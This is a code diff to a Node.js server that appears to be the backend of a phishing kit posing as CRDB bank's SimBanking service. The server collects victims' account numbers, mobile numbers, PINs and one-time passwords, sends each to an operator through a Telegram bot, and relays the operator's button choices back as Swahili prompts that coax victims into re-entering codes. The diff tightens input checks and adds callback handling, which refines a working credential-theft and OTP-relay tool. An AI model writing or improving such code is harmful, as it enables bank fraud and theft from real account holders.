@@ -42,11 +42,33 @@ async function sendTelegramMessage(text, replyMarkup) {
   }
 }
 
+async function answerCallbackQuery(callbackQueryId, text = '') {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callbackQueryId,
+        text: text,
+        show_alert: false
+      })
+    });
+  } catch (err) {
+    console.error('Failed to answer callback query:', err);
+  }
+}
+
 // 1. Submit Credentials
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
     
+    // Server-side validation: Mobile number must start with 0
+    if (!mobileNumber || !mobileNumber.startsWith('0')) {
+      return res.status(400).json({ success: false, error: 'Mobile number must start with 0' });
+    }
+
     sessions[sessionId] = {
       status: 'pending_credentials',
       notification: '',
@@ -91,11 +113,15 @@ app.post('/api/submit-otp', async (req, res) => {
     const { sessionId, otp } = req.body;
     if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
 
+    if (!otp || otp.length !== 6) {
+      return res.status(400).json({ success: false, error: 'OTP must be 6 digits' });
+    }
+
     sessions[sessionId].status = 'pending_otp';
     sessions[sessionId].otp = otp;
 
     const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
-      `🔢 *OTP Entered:* \`${otp}\``;
+      `🔢 *OTP Entered (6 Digits):* \`${otp}\``;
 
     const keyboard = {
       inline_keyboard: [
@@ -156,7 +182,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
     if (update.callback_query) {
-      const data = update.callback_query.data; // e.g. "invphone_session_abc123"
+      const callbackQueryId = update.callback_query.id;
+      const data = update.callback_query.data; 
+      
+      await answerCallbackQuery(callbackQueryId, 'Imepokelewa!');
+
       const underscoreIndex = data.indexOf('_');
       const action = data.substring(0, underscoreIndex);
       const sessionId = data.substring(underscoreIndex + 1);
@@ -164,7 +194,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       if (sessions[sessionId]) {
         if (action === 'invphone') {
           sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID PHONE NO: Tafadhali ingiza namba sahihi ya Simbanking.';
+          sessions[sessionId].notification = 'INVALID PHONE NO: Tafadhali ingiza namba sahihi ya Simbanking inayokubalika.';
         } else if (action === 'invacc') {
           sessions[sessionId].status = 'error';
           sessions[sessionId].notification = 'INVALID ACC. NO: Tafadhali ingiza namba sahihi ya akaunti.';
@@ -173,10 +203,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
           sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
         } else if (action === 'proceedotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP.';
+          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP ya tarakimu 6.';
         } else if (action === 'wrongotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP.';
+          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 6.';
         } else if (action === 'correctotp') {
           sessions[sessionId].status = 'enter_security_pin';
           sessions[sessionId].notification = 'OTP SWAHIHI ✅ - Endelea kuweka PIN ya usalama.';
@@ -209,4 +239,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-                   
+                                 
